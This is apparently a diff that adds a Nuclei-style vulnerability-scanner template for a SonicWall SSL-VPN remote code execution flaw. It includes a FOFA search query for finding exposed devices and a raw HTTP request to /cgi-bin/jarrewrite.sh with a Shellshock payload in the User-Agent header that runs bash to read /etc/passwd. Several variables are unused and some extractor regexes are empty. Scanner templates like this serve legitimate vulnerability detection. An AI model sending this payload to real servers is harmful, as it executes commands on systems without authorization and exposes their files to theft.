@@ -1,0 +1,43 @@
+id: SonicWall-SSLVPN-UA-rce
+info:
+  name: SonicWall-SSLVPN-UA-rce
+  author: sb    
+  severity: critical
+  description: 
+  metadata:
+    fofa-query: (body="login_box_sonicwall" || header="SonicWALL SSL-VPN Web Server") && body="SSL-VPN"
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
+  s1: '{{rand_base(5, "56789")}}'
+  str: '{{rand_base(4)}}'
+  rand: '{{rand_base(3)}}'
+http:
+  - raw:
+    - |      
+      GET /cgi-bin/jarrewrite.sh HTTP/1.1
+      User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
+      
+    extractors:
+      - type: regex
+        name: 
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - ''
+
+      - type: regex
+        name: 
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - ''
+          
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
